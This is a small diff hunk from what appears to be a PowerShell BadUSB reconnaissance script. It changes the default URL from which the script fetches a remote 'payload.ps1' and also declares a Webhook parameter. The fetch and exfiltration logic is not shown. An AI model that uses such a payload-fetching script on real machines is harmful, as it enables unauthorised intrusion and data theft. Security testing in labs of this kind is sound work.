@@ -12,7 +12,7 @@
 
 param(
     [string]$Webhook,
-    [string]$PayloadUrl = "https://raw.githubusercontent.com/AndYLndR/badusb-recon-lab/main/payloads/payload.ps1",
+    [string]$PayloadUrl = "https://raw.githubusercontent.com/AndYLndR/badusb-recon/main/payloads/payload.ps1",
     [string]$OutputPath
 )
 
